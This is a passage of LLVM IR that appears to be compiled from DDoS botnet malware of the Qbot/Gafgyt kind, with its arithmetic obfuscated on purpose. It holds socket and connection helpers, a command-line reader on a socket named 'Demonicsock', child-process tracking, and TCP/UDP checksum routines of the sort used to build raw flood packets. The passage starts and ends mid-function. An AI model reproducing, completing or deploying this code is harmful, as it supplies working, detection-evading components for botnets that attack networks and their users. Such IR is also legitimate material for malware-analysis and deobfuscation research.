  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #6
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %22, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %29

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = sub i32 %12, -493708100
  %14 = add i32 %13, 65
  %15 = add i32 %14, -493708100
  %16 = add i32 %12, 65
  %17 = trunc i32 %15 to i8
  %18 = load i8*, i8** %3, align 8
  %19 = load i32, i32* %5, align 4
  %20 = sext i32 %19 to i64
  %21 = getelementptr inbounds i8, i8* %18, i64 %20
  store i8 %17, i8* %21, align 1
  br label %22

; <label>:22:                                     ; preds = %10
  %23 = load i32, i32* %5, align 4
  %24 = sub i32 0, %23
  %25 = sub i32 0, 1
  %26 = add i32 %24, %25
  %27 = sub i32 0, %26
  %28 = add nsw i32 %23, 1
  store i32 %27, i32* %5, align 4
  br label %6

; <label>:29:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #6, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = xor i64 %43, -1
  %45 = xor i64 %37, -1
  %46 = xor i64 -4038332757467853022, -1
  %47 = and i64 %44, -4038332757467853022
  %48 = and i64 %43, %46
  %49 = and i64 %45, -4038332757467853022
  %50 = and i64 %37, %46
  %51 = or i64 %47, %48
  %52 = or i64 %49, %50
  %53 = xor i64 %51, %52
  %54 = or i64 %44, %45
  %55 = xor i64 %54, -1
  %56 = or i64 -4038332757467853022, %46
  %57 = and i64 %55, %56
  %58 = or i64 %53, %57
  %59 = or i64 %43, %37
  store i64 %58, i64* %42, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sub i32 0, 1
  %62 = sub i32 %60, %61
  %63 = add nsw i32 %60, 1
  %64 = call i32 @select(i32 %62, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %64, i32* %12, align 4
  %65 = icmp sle i32 %64, 0
  br i1 %65, label %66, label %111

; <label>:66:                                     ; preds = %33
  br label %67

; <label>:67:                                     ; preds = %104, %66
  %68 = load i32, i32* %13, align 4
  %69 = icmp slt i32 %68, 10
  br i1 %69, label %70, label %110

; <label>:70:                                     ; preds = %67
  %71 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %71, align 8
  %72 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %72, align 8
  br label %73

; <label>:73:                                     ; preds = %70
  %74 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %74, i64 0, i64 0
  %76 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %75) #6, !srcloc !2
  %77 = extractvalue { i64, i64* } %76, 0
  %78 = extractvalue { i64, i64* } %76, 1
  %79 = trunc i64 %77 to i32
  store i32 %79, i32* %14, align 4
  %80 = ptrtoint i64* %78 to i64
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %15, align 4
  br label %82

; <label>:82:                                     ; preds = %73
  %83 = load i32, i32* %5, align 4
  %84 = srem i32 %83, 64
  %85 = zext i32 %84 to i64
  %86 = shl i64 1, %85
  %87 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %88 = load i32, i32* %5, align 4
  %89 = sdiv i32 %88, 64
  %90 = sext i32 %89 to i64
  %91 = getelementptr inbounds [16 x i64], [16 x i64]* %87, i64 0, i64 %90
  %92 = load i64, i64* %91, align 8
  %93 = and i64 %92, %86
  %94 = xor i64 %92, %86
  %95 = or i64 %93, %94
  %96 = or i64 %92, %86
  store i64 %95, i64* %91, align 8
  %97 = load i32, i32* %5, align 4
  %98 = sub i32 %97, -816459343
  %99 = add i32 %98, 1
  %100 = add i32 %99, -816459343
  %101 = add nsw i32 %97, 1
  %102 = call i32 @select(i32 %100, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %102, i32* %12, align 4
  %103 = icmp sle i32 %102, 0
  br i1 %103, label %104, label %109

; <label>:104:                                    ; preds = %82
  %105 = load i32, i32* %13, align 4
  %106 = sub i32 0, 1
  %107 = sub i32 %105, %106
  %108 = add nsw i32 %105, 1
  store i32 %107, i32* %13, align 4
  br label %67

; <label>:109:                                    ; preds = %82
  br label %110

; <label>:110:                                    ; preds = %109, %67
  br label %111

; <label>:111:                                    ; preds = %110, %33
  store i32 0, i32* %18, align 4
  %112 = load i8*, i8** %6, align 8
  store i8* %112, i8** %17, align 8
  br label %113

; <label>:113:                                    ; preds = %135, %111
  %114 = load i32, i32* %7, align 4
  %115 = sub i32 0, %114
  %116 = sub i32 0, -1
  %117 = add i32 %115, %116
  %118 = sub i32 0, %117
  %119 = add nsw i32 %114, -1
  store i32 %118, i32* %7, align 4
  %120 = icmp sgt i32 %114, 1
  br i1 %120, label %121, label %141

; <label>:121:                                    ; preds = %113
  %122 = load i32, i32* @Demonicsock, align 4
  %123 = call i64 @recv(i32 %122, i8* %16, i64 1, i32 0)
  %124 = icmp ne i64 %123, 1
  br i1 %124, label %125, label %127

; <label>:125:                                    ; preds = %121
  %126 = load i8*, i8** %17, align 8
  store i8 0, i8* %126, align 1
  store i32 -1, i32* %4, align 4
  br label %144

; <label>:127:                                    ; preds = %121
  %128 = load i8, i8* %16, align 1
  %129 = load i8*, i8** %17, align 8
  %130 = getelementptr inbounds i8, i8* %129, i32 1
  store i8* %130, i8** %17, align 8
  store i8 %128, i8* %129, align 1
  %131 = load i8, i8* %16, align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 10
  br i1 %133, label %134, label %135

; <label>:134:                                    ; preds = %127
  br label %141

; <label>:135:                                    ; preds = %127
  %136 = load i32, i32* %18, align 4
  %137 = add i32 %136, 195403707
  %138 = add i32 %137, 1
  %139 = sub i32 %138, 195403707
  %140 = add nsw i32 %136, 1
  store i32 %139, i32* %18, align 4
  br label %113

; <label>:141:                                    ; preds = %134, %113
  %142 = load i8*, i8** %17, align 8
  store i8 0, i8* %142, align 1
  %143 = load i32, i32* %18, align 4
  store i32 %143, i32* %4, align 4
  br label %144

; <label>:144:                                    ; preds = %141, %125
  %145 = load i32, i32* %4, align 4
  ret i32 %145
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.fd_set, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i64, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i8* %1, i8** %7, align 8
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  %19 = load i32, i32* %6, align 4
  %20 = call i32 (i32, i32, ...) @fcntl(i32 %19, i32 3, i8* null)
  %21 = sext i32 %20 to i64
  store i64 %21, i64* %15, align 8
  %22 = load i64, i64* %15, align 8
  %23 = xor i64 %22, -1
  %24 = xor i64 2048, -1
  %25 = xor i64 1203603855374886223, -1
  %26 = and i64 %23, 1203603855374886223
  %27 = and i64 %22, %25
  %28 = and i64 %24, 1203603855374886223
  %29 = and i64 2048, %25
  %30 = or i64 %26, %27
  %31 = or i64 %28, %29
  %32 = xor i64 %30, %31
  %33 = or i64 %23, %24
  %34 = xor i64 %33, -1
  %35 = or i64 1203603855374886223, %25
  %36 = and i64 %34, %35
  %37 = or i64 %32, %36
  %38 = or i64 %22, 2048
  store i64 %37, i64* %15, align 8
  %39 = load i32, i32* %6, align 4
  %40 = load i64, i64* %15, align 8
  %41 = call i32 (i32, i32, ...) @fcntl(i32 %39, i32 4, i64 %40)
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %42, align 4
  %43 = load i32, i32* %8, align 4
  %44 = trunc i32 %43 to i16
  %45 = call zeroext i16 @htons(i16 zeroext %44) #9
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %45, i16* %46, align 2
  %47 = load i8*, i8** %7, align 8
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %49 = call i32 @getHost(i8* %47, %struct.in_addr* %48)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %4
  store i32 0, i32* %5, align 4
  br label %123

; <label>:52:                                     ; preds = %4
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %54 = getelementptr inbounds [8 x i8], [8 x i8]* %53, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 8, i32 4, i1 false)
  %55 = load i32, i32* %6, align 4
  %56 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %57 = call i32 @connect(i32 %55, %struct.sockaddr* %56, i32 16)
  store i32 %57, i32* %16, align 4
  %58 = load i32, i32* %16, align 4
  %59 = icmp slt i32 %58, 0
  br i1 %59, label %60, label %111

; <label>:60:                                     ; preds = %52
  %61 = call i32* @__errno_location() #9
  %62 = load i32, i32* %61, align 4
  %63 = icmp eq i32 %62, 115
  br i1 %63, label %64, label %109

; <label>:64:                                     ; preds = %60
  %65 = load i32, i32* %9, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 %66, i64* %67, align 8
  %68 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %68, align 8
  br label %69

; <label>:69:                                     ; preds = %64
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %71 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 0
  %72 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %71) #6, !srcloc !3
  %73 = extractvalue { i64, i64* } %72, 0
  %74 = extractvalue { i64, i64* } %72, 1
  %75 = trunc i64 %73 to i32
  store i32 %75, i32* %17, align 4
  %76 = ptrtoint i64* %74 to i64
  %77 = trunc i64 %76 to i32
  store i32 %77, i32* %18, align 4
  br label %78

; <label>:78:                                     ; preds = %69
  %79 = load i32, i32* %6, align 4
  %80 = srem i32 %79, 64
  %81 = zext i32 %80 to i64
  %82 = shl i64 1, %81
  %83 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %11, i32 0, i32 0
  %84 = load i32, i32* %6, align 4
  %85 = sdiv i32 %84, 64
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds [16 x i64], [16 x i64]* %83, i64 0, i64 %86
  %88 = load i64, i64* %87, align 8
  %89 = and i64 %88, %82
  %90 = xor i64 %88, %82
  %91 = or i64 %89, %90
  %92 = or i64 %88, %82
  store i64 %91, i64* %87, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 0, 1
  %95 = sub i32 %93, %94
  %96 = add nsw i32 %93, 1
  %97 = call i32 @select(i32 %95, %struct.fd_set* null, %struct.fd_set* %11, %struct.fd_set* null, %struct.timeval* %12)
  %98 = icmp sgt i32 %97, 0
  br i1 %98, label %99, label %107

; <label>:99:                                     ; preds = %78
  store i32 4, i32* %13, align 4
  %100 = load i32, i32* %6, align 4
  %101 = bitcast i32* %14 to i8*
  %102 = call i32 @getsockopt(i32 %100, i32 1, i32 4, i8* %101, i32* %13) #6
  %103 = load i32, i32* %14, align 4
  %104 = icmp ne i32 %103, 0
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %99
  store i32 0, i32* %5, align 4
  br label %123

; <label>:106:                                    ; preds = %99
  br label %108

; <label>:107:                                    ; preds = %78
  store i32 0, i32* %5, align 4
  br label %123

; <label>:108:                                    ; preds = %106
  br label %110

; <label>:109:                                    ; preds = %60
  store i32 0, i32* %5, align 4
  br label %123

; <label>:110:                                    ; preds = %108
  br label %111

; <label>:111:                                    ; preds = %110, %52
  %112 = load i32, i32* %6, align 4
  %113 = call i32 (i32, i32, ...) @fcntl(i32 %112, i32 3, i8* null)
  %114 = sext i32 %113 to i64
  store i64 %114, i64* %15, align 8
  %115 = load i64, i64* %15, align 8
  %116 = xor i64 -2049, -1
  %117 = xor i64 %115, %116
  %118 = and i64 %117, %115
  %119 = and i64 %115, -2049
  store i64 %118, i64* %15, align 8
  %120 = load i32, i32* %6, align 4
  %121 = load i64, i64* %15, align 8
  %122 = call i32 (i32, i32, ...) @fcntl(i32 %120, i32 4, i64 %121)
  store i32 1, i32* %5, align 4
  br label %123

; <label>:123:                                    ; preds = %111, %109, %107, %105, %51
  %124 = load i32, i32* %5, align 4
  ret i32 %124
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #6
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %61

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, -1085042670130277740
  %13 = add i64 %12, 1
  %14 = sub i64 %13, -1085042670130277740
  %15 = add i64 %11, 1
  store i64 %14, i64* @numpids, align 8
  %16 = load i64, i64* @numpids, align 8
  %17 = add i64 %16, 1348703009567050067
  %18 = add i64 %17, 1
  %19 = sub i64 %18, 1348703009567050067
  %20 = add i64 %16, 1
  %21 = mul i64 %19, 4
  %22 = call noalias i8* @malloc(i64 %21) #6
  %23 = bitcast i8* %22 to i32*
  store i32* %23, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %24

; <label>:24:                                     ; preds = %43, %10
  %25 = load i32, i32* %4, align 4
  %26 = zext i32 %25 to i64
  %27 = load i64, i64* @numpids, align 8
  %28 = add i64 %27, 4519599599445233053
  %29 = sub i64 %28, 1
  %30 = sub i64 %29, 4519599599445233053
  %31 = sub i64 %27, 1
  %32 = icmp ult i64 %26, %30
  br i1 %32, label %33, label %48

; <label>:33:                                     ; preds = %24
  %34 = load i32*, i32** @pids, align 8
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = getelementptr inbounds i32, i32* %34, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = load i32*, i32** %3, align 8
  %40 = load i32, i32* %4, align 4
  %41 = zext i32 %40 to i64
  %42 = getelementptr inbounds i32, i32* %39, i64 %41
  store i32 %38, i32* %42, align 4
  br label %43

; <label>:43:                                     ; preds = %33
  %44 = load i32, i32* %4, align 4
  %45 = sub i32 0, 1
  %46 = sub i32 %44, %45
  %47 = add i32 %44, 1
  store i32 %46, i32* %4, align 4
  br label %24

; <label>:48:                                     ; preds = %24
  %49 = load i32, i32* %2, align 4
  %50 = load i32*, i32** %3, align 8
  %51 = load i64, i64* @numpids, align 8
  %52 = add i64 %51, 3071064593277183391
  %53 = sub i64 %52, 1
  %54 = sub i64 %53, 3071064593277183391
  %55 = sub i64 %51, 1
  %56 = getelementptr inbounds i32, i32* %50, i64 %54
  store i32 %49, i32* %56, align 4
  %57 = load i32*, i32** @pids, align 8
  %58 = bitcast i32* %57 to i8*
  call void @free(i8* %58) #6
  %59 = load i32*, i32** %3, align 8
  store i32* %59, i32** @pids, align 8
  %60 = load i32, i32* %2, align 4
  store i32 %60, i32* %1, align 4
  br label %61

; <label>:61:                                     ; preds = %48, %8
  %62 = load i32, i32* %1, align 4
  ret i32 %62
}

; Function Attrs: nounwind
declare i32 @fork() #3

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %14
  %16 = sub i64 0, %13
  %17 = add i64 %15, %16
  %18 = sub i64 0, %17
  %19 = add i64 %14, %13
  store i64 %18, i64* %5, align 8
  %20 = load i32, i32* %4, align 4
  %21 = sub i32 0, 2
  %22 = add i32 %20, %21
  %23 = sub nsw i32 %20, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  br label %37

; <label>:37:                                     ; preds = %41, %36
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %53

; <label>:41:                                     ; preds = %37
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 65535, -1
  %44 = xor i64 %42, %43
  %45 = and i64 %44, %42
  %46 = and i64 %42, 65535
  %47 = load i64, i64* %5, align 8
  %48 = lshr i64 %47, 16
  %49 = sub i64 %45, -4662489529948127150
  %50 = add i64 %49, %48
  %51 = add i64 %50, -4662489529948127150
  %52 = add i64 %45, %48
  store i64 %51, i64* %5, align 8
  br label %37

; <label>:53:                                     ; preds = %37
  %54 = load i64, i64* %5, align 8
  %55 = xor i64 %54, -1
  %56 = and i64 2902018643629674911, %55
  %57 = xor i64 2902018643629674911, -1
  %58 = and i64 %54, %57
  %59 = xor i64 -1, -1
  %60 = and i64 %59, 2902018643629674911
  %61 = and i64 -1, %57
  %62 = or i64 %56, %58
  %63 = or i64 %60, %61
  %64 = xor i64 %62, %63
  %65 = xor i64 %54, -1
  %66 = trunc i64 %64 to i16
  ret i16 %66
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #9
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #6
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #6
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcp_udp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %41

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 %30, -56106158
  %32 = add i32 %31, %29
  %33 = add i32 %32, -56106158
  %34 = add i32 %30, %29
  store i32 %33, i32* %12, align 4
  %35 = load i16*, i16** %9, align 8
  %36 = getelementptr inbounds i16, i16* %35, i32 1
  store i16* %36, i16** %9, align 8
  %37 = load i32, i32* %8, align 4
  %38 = sub i32 0, 2
  %39 = add i32 %37, %38
  %40 = sub nsw i32 %37, 2
  store i32 %39, i32* %8, align 4
  br label %23

; <label>:41:                                     ; preds = %23
  %42 = load i32, i32* %8, align 4
  %43 = icmp eq i32 %42, 1
  br i1 %43, label %44, label %55

; <label>:44:                                     ; preds = %41
  %45 = load i16*, i16** %9, align 8
  %46 = bitcast i16* %45 to i8*
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = load i32, i32* %12, align 4
  %50 = sub i32 0, %49
  %51 = sub i32 0, %48
  %52 = add i32 %50, %51
  %53 = sub i32 0, %52
  %54 = add i32 %49, %48
  store i32 %53, i32* %12, align 4
  br label %55

; <label>:55:                                     ; preds = %44, %41
  %56 = load i32, i32* %10, align 4
  %57 = lshr i32 %56, 16
  %58 = xor i32 65535, -1
  %59 = xor i32 %57, %58
  %60 = and i32 %59, %57
  %61 = and i32 %57, 65535
  %62 = load i32, i32* %12, align 4
  %63 = add i32 %62, 908449602
  %64 = add i32 %63, %60
  %65 = sub i32 %64, 908449602
  %66 = add i32 %62, %60
  store i32 %65, i32* %12, align 4
  %67 = load i32, i32* %10, align 4
  %68 = xor i32 %67, -1
  %69 = xor i32 65535, -1
  %70 = xor i32 -2069867692, -1
  %71 = or i32 %68, %69
  %72 = or i32 -2069867692, %70
  %73 = xor i32 %71, -1
  %74 = and i32 %73, %72
  %75 = and i32 %67, 65535
  %76 = load i32, i32* %12, align 4
  %77 = sub i32 0, %74
  %78 = sub i32 %76, %77
  %79 = add i32 %76, %74
  store i32 %78, i32* %12, align 4
  %80 = load i32, i32* %11, align 4
  %81 = lshr i32 %80, 16
  %82 = xor i32 65535, -1
  %83 = xor i32 %81, %82
  %84 = and i32 %83, %81
  %85 = and i32 %81, 65535
